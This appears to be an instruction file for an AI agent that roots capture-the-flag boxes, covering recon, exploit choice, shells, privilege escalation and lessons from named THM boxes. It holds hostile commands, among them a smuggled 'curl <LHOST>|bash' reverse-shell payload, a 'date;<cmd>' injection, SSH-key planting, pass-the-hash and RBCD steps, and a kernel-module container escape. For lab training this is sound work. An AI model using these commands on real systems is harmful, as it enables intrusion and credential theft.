---
name: ctf-box
description: Boot-to-root methodology for a full machine (THM/HTB/PG/CTF box, "get user.txt+root.txt", "root the box", "foothold to root"). Enforces basic-tool recon (nmap, nc, ffuf, nuclei, dig) before anything custom, wiki-first lookups, and ALWAYS pspy + linpeas/winpeas for privesc. Use when handed a box/IP to own end-to-end.
---

# CTF / Boot-to-Root Box

Own a whole machine: recon -> service triage -> foothold -> user.txt -> privesc -> root.txt.
**Run everything from the engagement tooling host (e.g. Kali in tmux), capture into `targets/<eng>/`.**

Track progress in `targets/<eng>/killchain.md` -- work the current phase's open items, mark `[x]` as each
lands; honor GATE 1 (no hand-rolled exploit before its wiki item is `[x]`), GATE 2 (no exploit step `[x]`
without a `poc/` image), GATE 3 (exhausted vector -> `[!]` + one `Deadends.md` line, never re-run it).

## Standing mandate: Wiki-first, tools-before-scripts (GATE 1, all phases)

This mandate stands over every phase below. Before writing ANY custom script or recalling an exploit from memory:
1. `qmd_query "<tech/version> exploit"` and `qmd_query "<service> privilege escalation"` via wiki-search MCP. Read matches.
2. Pull payloads from `wiki/payloads/` and chains from `wiki/cheatsheets/attack-chains.md` + `wiki/cheatsheets/cve-arsenal.md`, or `Skill(arsenal)` to resolve the exact file.
3. Privesc reference: `wiki/techniques/linux/linux-privesc.md` / `wiki/cheatsheets/linux-privesc.md` (or windows-privesc).
Only after the wiki has nothing do you write a custom PoC. Do not reinvent what the wiki already documents.

**Tooling home:** check `/opt/arsenal` first for pspy/linpeas/shot/capture. pspy64/linpeas/winPEAS live in `/opt/arsenal`, seeded by `vm-provision.sh` from their GitHub releases; our own helpers (`shot.py`, `capture.sh`) are pushed on demand by `bash scripts/vm-sync.sh <name>` from the vault.

**Anti-pattern:** a raw one-shot `bash /root/vm.sh '<exploit>'` (or an inline `node -e`/`python3 -c` payload through it) for a listener, shell, or chained exploit is the smell this mandate exists to catch -- it skips wiki-first and leaves no session to capture. Run persistent/interactive steps in their own named tmux tab instead: `scripts/vm-scan.sh <eng> <target> '<cmd>'`.

## Phase 1 Recon: basic tools only (in this order)

Use the standard toolkit. Do NOT hand-roll recon scripts.

Tooling-first: use nmap/ffuf/nuclei/nxc - never hand-roll a /dev/tcp port loop or a curl fuzz loop (weaker, skips the fingerprint router). Capture the nmap surface + ffuf hits as evidence (Skill(screenshot) `--term`).

Run each scan in its own tmux tab on the VM (root, persistent, survives a dropped `vm.sh` call), one tab per target: `bash scripts/vm-scan.sh <eng> <target> '<scan>'` (multi-web target -> `<target>-web-<ip-or-domain>`, one tab each). Screenshot a live/finished tab with `Skill(screenshot)` `--tmux <eng>:<tab>` (use the `@NN` id or sanitized tab name `vm-scan.sh` prints, not a dotted target). The scan commands below are what you launch inside each tab.

**vm.sh drops long FOREGROUND commands (exit 255, no output).** A single `bash /root/vm.sh '<cmd>'` that runs more than ~2 min (scan / crack / spray / brute loop) gets its SSH cut mid-run. Run ANY long task DETACHED and poll a file: a tmux tab (`vm-scan.sh`), or `nohup <cmd> >/tmp/out 2>&1 & ` then poll `for i in $(seq 1 60); do grep -q DONE /tmp/out && break; sleep 3; done`. Never block one vm.sh call on a slow task. Stdin is NOT forwarded through vm.sh either - push files by base64-into-the-command (`echo <b64> | base64 -d > ~/file`), and write+run in ONE call to avoid a race.

```bash
T=<ip>
# Full TCP, then scripts/version on found ports
nmap -p- --min-rate 2000 -T4 -Pn $T -oN nmap-all.txt
nmap -sCV -p<found> -Pn $T -oN nmap-svc.txt
nc -nv $T <port>                 # manual banner / custom-proto services (chatbots, etc.)
dig any @$T <domain>; dig axfr @$T <domain>   # DNS if 53 open / vhost hints
# Web (per http port):
ffuf -u http://$T/FUZZ -w scripts/wordlists/harness-paths.txt -e .php,.py,.html,.txt -mc 200,301,302,401,403 -ac   # OUR high-signal list FIRST (non-obvious routes the big lists bury: /internal,/health,/customapi...)
ffuf -u http://$T/FUZZ -w /usr/share/seclists/Discovery/Web-Content/ractf-medium.txt -ac      # then the big list
ffuf -u "http://$T/?FUZZ=x" -w scripts/wordlists/harness-params.txt -fs <baseline>            # param mining (SSRF/LFI/cmdi names)
ffuf -u http://$T/ -H "Host: FUZZ.$T" -w <vhost-wordlist> -ac                                  # vhosts
nuclei -u http://$T -o nuclei.txt                                                              # known CVEs/misconfig
whatweb http://$T ; curl -s -I http://$T                                                       # fingerprint + cookies (ID the app/version)
wpscan -u http://$T                                                                            # If there is a wordpress
```
**Wordlists live on the attacker box, not always on the scan VM.** `scripts/wordlists/*` (vault path)
and `/usr/share/seclists/*` may NOT exist on the VM you run ffuf from. A missing `-w` makes ffuf
print its **help text and silently find NOTHING** - a false "no hidden endpoints / no LFI param"
that once cost a whole box (concluded the app had no vuln when the fuzzer never ran). Preflight every
fuzz: `ls "$W" || W=/usr/share/wordlists/dirb/big.txt`. seclists is often absent (stock Kali without
the `seclists` package has only `/usr/share/wordlists/dirb/*`); push the harness lists to the VM
(`base64` them over to `/tmp/`) before using `scripts/wordlists/harness-*.txt`.

Fingerprint the exact app + version. **On any fingerprinted surface/service, `Skill(arsenal)` FIRST**: it maps the surface to the automated tools we already document in `wiki/tools/` (web -> httpx/ffuf/feroxbuster/nuclei/dalfox/wpscan; SMB/AD -> netexec/bloodhound; login -> hydra/hashcat; ...) so you use OUR tool for the service instead of hand-rolling, THEN the technique/payload (`wiki/payloads` + the matching hunt skill). Then hand web vulns to the matching hunt skill (sqli/ssrf/upload/...) via triggers. Screenshot each finding AS it lands (`Skill(screenshot)`), not at the end. **OT/ICS ports (502 Modbus / 102 S7 / 44818 EtherNet/IP / 1880 Node-RED / an HMI web app) -> `Skill(hunt-ics)`** (drive the plant to a danger state; the flag is often a visual overlay in the HMI/CCTV media).

## Phase 2 Weaponize: pick the exploit

- Map version -> `searchsploit <app> <ver>` and the wiki CVE lookup ([[cve-arsenal]]); prefer the documented PoC over a fresh one.
- Pick the payload set from `wiki/payloads/` for the fingerprinted class (GATE 1: the wiki item is `[x]` before you hand-roll a PoC).
- Stage the chosen exploit/PoC into `targets/<eng>/poc/scripts/` before firing, so the code and the run are captured together.

## Phase 3 Deliver: land a shell

- Deliver the staged payload/exploit against the target; prefer the documented PoC over a fresh one.
- Get a stable shell early: upgrade to PTY (`python3 -c 'import pty;pty.spawn("/bin/bash")'`), or better, drop your SSH key into a writable user's `~/.ssh/authorized_keys` for a resilient session.
- **Cred-reuse FIRST.** Capture creds to `targets/<eng>/loot.md` immediately; try reuse (su / ssh / other services) BEFORE hunting new ones. DB/web creds are very often **reused for SSH**.

## Phase 4 Exploit: finish the foothold, then privesc

Finish the foothold first (leftover Rule 2 techniques, if the shell landed mid-app):
- **Consistent escalation primitive:** if a box exposes the SAME pivot at each stage (a Docker socket/TLS pivot per level, an SSRF each hop), verify/exhaust that intended vector end-to-end BEFORE an opportunistic shortcut (raw device mount, a memory CVE). A shortcut that relies on `--privileged`/a loose cap can mask that a hardened config would block it, and it is less reproducible/auditable. Getting the flag via a shortcut is fine; SKIPPING the taught vector without testing it is the miss.
- Web SQLi: in-band (UNION/error) before blind; test EVERY quote context (`'` `"` numeric) and second-order (a stored value used unsafely on another page). If the app hashes the password inside the query, read plaintext from `information_schema.PROCESSLIST`. Load `Skill(hunt-sqli)` / see [[sql-injection]].
- Recovered unsalted MD5/SHA1: **online lookup first** (CrackStation/hashes.com) before hashcat/john. A hash that resists everything on a hard box may be a deliberate decoy; pivot, don't grind.

Then privesc = pspy ALWAYS + linpeas/winpeas, then manual.

**Always run pspy first** to catch root-run background jobs/cron/timers that static checks miss:
```bash
# upload pspy64 (host it on the tooling box, curl/wget it down) and watch >=60s
./pspy64 -pf -i 1000     # see every exec + file event as root; reveals per-minute cron/systemd timers
```
Then the automated sweep:
```bash
./linpeas.sh         # linux   (winpeas.exe / winpeas.bat on windows)
# AVOID `-a` (deep/thorough) on small boxes (<=1-2 GB RAM, most THM VMs): the full scan can
# OOM-thrash the target until every service (ssh/http/db) times out - looks exactly like the box
# crashed. Use the default scan, or throttle: `nice -n19 ionice -c3 ./linpeas.sh`. If it does hang
# the box, `pkill -9 -f linpeas` (kill it as the user that launched it) and load drains in seconds.
```
Capture linpeas/pspy findings as terminal-card evidence (Skill(screenshot) `--term`) - the colored highlights survive.

Then walk the manual checklist (do not skip any; the box's intended path is usually ONE of these):

| Check | Command | Win = |
|---|---|---|
| sudo rights | `sudo -l` | NOPASSWD/GTFObin -> root |
| SUID/SGID | `find / -perm -4000 -o -perm -2000 2>/dev/null` | GTFObins |
| Capabilities | `getcap -r / 2>/dev/null` | cap_setuid etc. |
| Cron | `cat /etc/crontab /etc/cron.d/*; ls -la /etc/cron.*` + pspy | writable/relative-path script |
| **systemd timers** | `systemctl list-timers --all` + `systemctl cat <svc>` | **writable ExecStart script run as root** (e.g. THM Ollie `feedme.timer`) |
| Writable root files | writable scripts/units root executes; `/etc/passwd` writable | inject payload, wait for trigger |
| Groups | `id` (docker/lxd/disk/adm/shadow) | group->root GTFO |
| Creds | configs, history, DB, `.ssh`, backups | reuse / su |
| Kernel/pkg CVE | `uname -r`; pkg versions (pkexec/polkit, sudo, dbus) | **LAST resort** - check the patch level first (see lesson) |

## Lesson: verify exploit preconditions before firing (THM Ollie)

Intended path was PwnKit (CVE-2021-4034) but the box was kernel-patched:
- **PwnKit dead** on kernels with the `argc==0` mitigation (5.x+); pkexec prints usage, GCONV_PATH never injects.
- **CVE-2021-3560** dead once polkit >= 0.105-26ubuntu1.1 (race returns PermissionDenied in ~9ms).
- **Nimbuspwn** needs to own `org.freedesktop.network1` (dbus policy usually = systemd-network only).
- The real path was a **writable root systemd timer** (`feedme`) firing every minute - which **pspy/linpeas surface in seconds**. Run them first; treat kernel CVEs as the last resort and check `uname -r` + package patch level before burning time.

**Kernel-CVE reflex = wiki-first, not memory.** When you DO reach for a kernel LPE, open
[[privesc-exploit-arsenal]] FIRST (I once defaulted to stale public-CVE memory and dismissed a
viable path). Match the exact `uname -r` band, then VERIFY the precondition before firing (module
loadable / address-family reachable / unprivileged userns). The Tinoco 2026 page-cache set
(copyfail/dirtyfrag/peditcow/... CVE-2026-*) spans 4.14->7.x and is unpatched on most pre-2026
boxes. **Lab-confirmed:** copyfail CVE-2026-31431 roots a 5.4.0-173 box from a low-priv user
(probe `socket.socket(38,SOCK_SEQPACKET).bind(("aead","authencesn(hmac(sha256),cbc(aes))"))` - if it
binds, reachable; port the PoC's `os.splice` -> `ctypes` `syscall(275,...)` on Python 3.8; restore a
poisoned file with root `echo 3 > /proc/sys/vm/drop_caches`). On a THM/HTB box you own, testing the
arsenal end-to-end is fair game.

## Lesson: mutate leaked/labelled secrets; cookie-BFLA is not session admin (THM Support Panel)

A PHP panel that leaked its own source via an LFI (`readfile`/`highlight_file` of `?skin=../config`):
- **A labelled secret that fails as a literal is a SEED, not always a decoy.** Source leaked
  `$MASTER_PASSWORD='support@110'`; it failed on every login/SSH. The admin's real password was a
  **mutation**: `support@110` -> `support110` (drop the `@`). Mutate leaked/hint values
  (`echo '<seed>' | hashcat --stdout -r best64.rule`, plus manual case/number/suffix/`@`-drop)
  against the real login BEFORE declaring decoy or committing to a full rockyou brute (which gave a
  misleading ~40h ETA and never would have hit it). See [[password-cracking]].
- **A forgeable cookie usually gates only PART of the app.** `isITUser=md5(user.admin?"true":"false")`
  forged to `md5("true")` unlocked the API + IDOR, but the RCE and the flag were gated by
  `$_SESSION['admin']`, set ONLY at a real login. The cookie BFLA was a deliberate distraction.
  Map WHICH check (cookie vs session) gates the thing you actually want before assuming "I'm admin".
- Command sink behind a prefix allowlist (`strpos($cmd,'date')===0`) -> chain off it: `date;<cmd>`.

## Lesson: reverse-proxy smuggling chain + go-for-shell efficiency (THM Contrabando)

Front Apache proxies `/page/(.*)` to a backend; the chain plus the efficiency mistakes worth not repeating:
- **Fuzz behind the proxy.** `ffuf -u http://T/page/FUZZ -e .php -fw <readfile-error-wc>` found `gen.php`, a sink the proxy never routes externally. Find the unrouted endpoint BEFORE reading source.
- **CVE-2023-25690** (Apache <= 2.4.55 `RewriteRule [P]`): raw `%0d%0a` in the captured path splits the proxied request, smuggling a POST to that cmd-injection sink. Exact bytes + gotchas (leading `x`, `%20` ends the request line, `&`->`%26`, exact CL) in [[http-request-smuggling]].
- **Once egress is confirmed, go straight for a reverse shell:** smuggle `length=;curl <LHOST>|bash;` with the payload at web-root `index.html` so the body has NO slashes (dodges the front's literal-`/` 404 and all double-encoding). Do NOT grind blind-RCE-to-file + LFI-read; a real shell makes the downstream brute-force and the python2 trick trivial. The blind `id>%252ftmp%252fo` + LFI-read path is only the no-egress fallback (slow, racy, truncates long commands; for those host a script and smuggle the short `curl <IP>|bash`).
- **No container escape (no docker.sock, CapEff=0, no host mount)? Pivot over the docker network, not out of the container.** `rustscan --top -a 172.18.0.1,172.18.0.2 --accessible` from the container found an internal Flask app on `172.18.0.1:5000`.
- **Internal "fetch a URL" service = SSRF + often SSTI.** It rendered the fetched response via `render_template_string`, so host a Jinja2 template, `website_url=http://<LHOST>/t`, RCE as the app user; `file://` also reads host files. See [[ssti]].
- **Privesc:** sudo `python*` arg-glob picks python2 -> `input()`=`eval()`; an unquoted `[[ == ]]` vault script is a glob oracle leaking the sudo password. See [[linux-privesc]].
- **Orchestration:** if you delegate this box to a background fork, do NOT also exploit it in parallel. A long brute-force makes the fork look idle while it is alive; shared `/tmp` files + app render-caches make your runs and the fork's indistinguishable. Wait for the completion signal or `SendMessage`-ping.

## Lesson: Windows AD box, RDP-only foothold -> KeePass (DPAPI) -> RBCD to DA (THM Forward)

Assumed-breach low-priv domain user; DA via a credential chain (no Linux, no memory-CVE). Load `Skill(hunt-ad)`.
- **RDP-only foothold.** User in **Remote Desktop Users** but NOT local-admin and no WinRM = interactive RDP is
  the only exec path. Drive it HEADLESS from Kali: `Xvfb :99 &` + `DISPLAY=:99 xfreerdp3 /v: /u: /p: /d: /cert:ignore
  /drive:sh,/tmp/share` (FreeRDP 3.x wants `/cert:ignore`, NOT `/cert-ignore`) + `xdotool key super+r` then type
  `cmd /c \\tsclient\sh\run.bat`, with output redirected to the `\\tsclient\sh` drive. Read GUI secrets by SCREENSHOT
  (`import -window root`); the headless clipboard is unreliable (syncs 1 byte). Full recipe in [[ad-lateral-movement]].
- **AppLocker-Restricted user:** a dropped .exe (winPEAS/SharpUp) is blocked - enumerate with built-ins
  (reg/sc/wmic/schtasks/dir), which run from the allowed C:\Windows.
- **KeePass DB (`*.kdbx`) on the box:** if `keepass2john`/pykeepass reject EVERY password, it is not password-locked.
  Check `KeePass.config.xml` KeySources - `<UserAccount>true</UserAccount>` = protected by the **Windows account
  (DPAPI), uncrackable offline**. OPEN it on the box as that user (only "Windows user account" ticked -> OK). Creds
  inside often **REUSE** to a higher-priv account - spray them. See [[password-cracking]].
- **RBCD to DA** once you own an account with `AddAllowedToAct`/GenericWrite on a computer (BloodHound): `addcomputer
  FAKE$` (MAQ>0) -> `rbcd -action write` -> `getST -impersonate Administrator -spn cifs/DC` -> `secretsdump -k`.
- **Reading the flag as DA:** Defender may block `nxc -x`/wmiexec output retrieval - read files directly over SMB with
  PtH (`smbclient //DC/C$ -U DOM/Administrator --pw-nt-hash <hash> -c 'get <path>'`); no exec = no AV.

## Lesson: crypto-app chain -> invite forge -> padding-oracle RCE (THM Decryptify)

PHP web app on a high port; no memory CVE, the whole box is applied crypto. Load `Skill(hunt-sqli)`/wiki [[cryptography-attacks]].
- **Deobfuscate client JS for secrets.** obfuscator.io-style `api.js` (string-array + rotator) hides an API
  password/key. Don't hand-trace: run the decoder in node -- `node -e "$(cat api.js); console.log(c)"` prints
  the decoded `const`. It gated `api.php`, whose "docs" leaked the token algorithm.
- **Directory listing is the crack.** ffuf found `/logs/` (autoindex) -> `app.log` leaked a valid
  (email, invite_code) pair, the email domain, and which users are active. That one pair breaks the token scheme.
- **Weak `mt_rand` token forge from ONE pair.** Token = `mt_srand(seed(email,CONST)); base64(mt_rand())`. Recover
  the unknown `CONST` offline by bruting until the leaked pair reproduces (PHP 8 cli replicates a PHP 7.x target;
  `mt_rand` is stable 7.1+), then forge any user's code -> login. See [[cryptography-attacks]] PRNG.
- **Encrypted param -> padding-oracle RCE.** A hidden `?date=` blob, re-encrypted each load, decrypted server-side
  and its value RUN as a shell command (output echoed in the footer). The openssl error leaked an **8-byte IV = 64-bit
  cipher, NOT AES** (stop guessing AES keys). App showed a distinct "Padding error" vs clean render = **padding oracle**.
  No padbuster on the VM -> ~60-line Python oracle: decrypt the blob (plaintext was literally `date +%Y` -> confirms the
  `shell_exec` sink), then **CBC-R forge** a blob decrypting to `cat /home/ubuntu/flag.txt` -> RCE, no key. `THM{GOT_COMMAND_EXECUTION001}`.
- **Anti-grind:** guessing the cipher KEY was a dead-end (~130 combos); the padding oracle needs NO key. When an app
  echoes padding validity, reach for the oracle, don't brute keys. Forging (CBC-R) is the payload, not just decryption.

## Lesson: cred-reuse-first, don't blind-scrape a SPA admin, linpeas-not-by-hand (THM Voyage)

Joomla 4.2.7 -> CVE-2023-23752 leaked the DB root password. Chain: cred-reuse -> root SSH on a pivot
container -> internal Flask app pickle-deser RCE -> `cap_sys_module` kmod escape to host root. Three misses:
- **A leaked cred is a REUSE probe before it is a research target.** The DB password was reused for root
  SSH on a second port. Test any leaked/default cred against SSH + every other auth surface FIRST; only
  then commit to a slower web-admin exploit chain. (Rule 2 says this; the miss was ~13 calls blind-scraping
  the admin panel before trying the obvious reuse.)
- **Modern CMS/SPA admin panels are JS-rendered**, so `curl` sees only page chrome (no list rows/ids). Do
  NOT grind a template-editor RCE over `curl` against a Joomla 4 / SPA admin - drive a real browser, or
  (usually) the intended foothold is elsewhere (here: the cred reuse).
- **Privesc = linpeas/pspy FIRST (Rule 3), not hand-rolled `ls`/`find`/`cat`.** The smell is enumerating by
  hand before the automated sweep runs. `cap_sys_module` escape: `capsh --print | grep sys_module` then
  build+`insmod` a module into the host (`call_usermodehelper`); if headers != running kernel, patch the
  `.ko` vermagic to `uname -r` - see [[linux-privesc]].

## Capture (engagement discipline)

After each phase, write to `targets/<eng>/`: hosts/access -> `state.md`, creds -> `loot.md`, chain -> `paths.md`, vulns -> `Vuln-index.md`, dead-ends -> `Deadends.md`, narrative -> `log.md`. Flags go in the writeup, never in `session/*` or `wiki/`.

**Preserve exploit scripts and read source.** When you write the exploit script Rule 0 has you fall back to (a payload HTML, an escape/forge script, a webshell) or read a target's source, copy it into `targets/<eng>/poc/scripts/` and card the source with its URL (e.g. `shot.py --term --url-bar`); the reviewer needs the code and the state together, the thm_tricipher standard.

**Screenshot EVERY successful step as you go (not at the end).** The walkthrough must be report-ready
from the `.md` alone. The moment a step LANDS - valid cred / Pwn3d, a BloodHound edge, a GUI foothold
(RDP desktop, unlocked KeePass, admin panel), a bad permission found, the DA hash, the flag - capture it
LIVE and drop the `![]()` ref inline at that step + in the `## Evidence` gallery. There is NO auto-capture
net anymore: evidence is captured LIVE via `scripts/capture.sh` (ev/req/tmux/burp) straight into `poc/`
the MOMENT a step lands, never at the end. **One-call live path (`capture.sh ev`):** tee the step's output
on the VM, then `scripts/capture.sh ev <eng> <slug> "<request-url>" "<cmd-label>"` - it cards the output
showing BOTH the command and the request URL and pulls the PNG into `poc/` in a single call, so live
capture has no friction (`cmd`+`url` are required, so no card is anonymous). **For a lead from a web
request** (a curl returning creds / a flag / leaked source), the real curl **request+response** is the
artifact - `scripts/capture.sh req <eng> <slug> -- <curl-args>` captures a full-fidelity `curl -iv`
request/response card (crypto-forged? give the exploit a `--curl` mode that emits the concrete curl). For
evidence that should look like a real tmux session run `scripts/capture.sh tmux <eng> <slug> <script.sh>`;
a Burp Repeater req/resp PoC is `scripts/capture.sh burp ...`. `Skill(screenshot)` covers authed/exploited
states (dashboard, vuln firing, the flag) and the narrative `--tmux` session cards. Under the hood:
CLI/tool output -> `shot.py --term` (colored terminal card) or `--tmux` (live tab); GUI/desktop ->
`--window`/`--screen` (or `import -window root` off a headless xfreerdp). Backfilling at the end loses
transient state (sessions, dialogs, one-shot output) - capture at the moment of success. **NEVER hand-write
a tool's output into a `--term` card - that is fabricated evidence.** Capture the REAL stream: if a command
is launched with output redirected (`> log`), the tmux pane stays EMPTY, so `tee` the output into the pane
OR `shot.py --term <the-real-logfile>`. GUI foothold that can't reproduce (RDP session, unlocked KeePass) -
screenshot it live; a box that expires cannot be recaptured. Curate your `poc/` step shots into the
`## Evidence` gallery, or run `python3 scripts/build-walkthrough.py <eng>` to auto-populate that gallery
from every rendered card in `poc/` (it refreshes the Evidence table in place and never touches your narrative).

**Grow the harness wordlist.** If a non-obvious route/file/param cracked the box (one the standard
lists missed, e.g. `/internal`), feed the GENERIC token back so the next box is faster:
`python3 scripts/wordlist-suggest.py` (leak-safe, read-only) then `scripts/wl-add.sh paths <token>`
/ `wl-add.sh params <name>`. Add only generic methodology names - never client-specific branding.

## Context tools

<!-- auto-wired: documented tools to reach for; do not hand-roll -->
- [[nmap]]
- [[rustscan]]
- [[naabu]]
- [[ffuf]]
- [[feroxbuster]]
- [[gobuster]]
- [[nuclei]]
- [[nikto]]
- [[whatweb]]
- [[arjun]]
- [[dalfox]]
- [[swaks]]
- [[recon]]
- [[nuclei-arsenal]]
- [[wordlists]]
- [[network-services]]
- [[linux-enumeration]]
- [[windows-enumeration]]
- [[windows-privesc]]
- [[password-attacks]]
- [[sqlmap]]
- [[pivoting]]
- [[web-client-attacks]]
- [[metasploit]]
